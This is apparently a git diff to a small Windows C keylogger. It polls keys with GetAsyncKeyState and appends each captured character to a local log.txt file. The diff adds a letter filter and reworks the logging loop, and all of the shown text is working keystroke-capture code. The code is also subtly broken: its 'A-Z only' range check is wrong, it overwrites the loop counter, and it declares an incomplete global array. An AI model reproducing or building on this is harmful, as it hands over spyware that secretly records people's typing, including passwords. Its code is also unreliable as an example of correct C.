@@ -40,30 +40,54 @@
   #include <Windows.h>
   #pragma comment(lib, "User32.lib")
   // Run main function
+
+int vk_size = 2;
+char vk_string[];
+
+  int process_vKey(int vk){
+    printf("Key pressed %c with number %i\n", vk, vk);
+
+    //A-Z only
+    if ( vk > 40 && vk < 90){
+      vk_size = 2;
+      return vk;
+    }
+    else{
+      return 0;
+    }
+  }
+
   int main(){
     printf("Compiled on windows\n");
 
     int last_vKey = 0;
   	while (1){
-  		for (int vKey = 0; vKey < 255; ++vKey)
+  		for (int vKey = 30; vKey < 100; ++vKey)
   		{
   			if (GetAsyncKeyState(last_vKey) != 0)
   				continue;
 
-  			last_vKey = 0;
-
+  			last_vKey = vKey;
+        // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate
   			if (GetAsyncKeyState(vKey) != 0)
   			{
   				last_vKey = vKey;
-
+          vKey = process_vKey(vKey);
   				FILE *f = NULL;
   				fopen_s(&f, "log.txt", "a+");
+        /**  int *size = malloc(vk_size);
+          printf("%i\n",*size);
+          free(size);**/
 
   				char buffer[4];
-          printf("[*] Key pressed: %c \n", vKey);
-  				sprintf_s(buffer, sizeof(buffer), "%c", vKey);
-  				fwrite(buffer, 1, 1, f);
-  				fclose(f);
+
+          if (vKey != 0){
+            printf("[*] Key processed: %c \n", vKey);
+    				sprintf_s(buffer, sizeof(buffer), "%c", vKey);
+    				fwrite(buffer, 1, 1, f);
+          }
+
+          fclose(f);
   			}
   		}
   	}
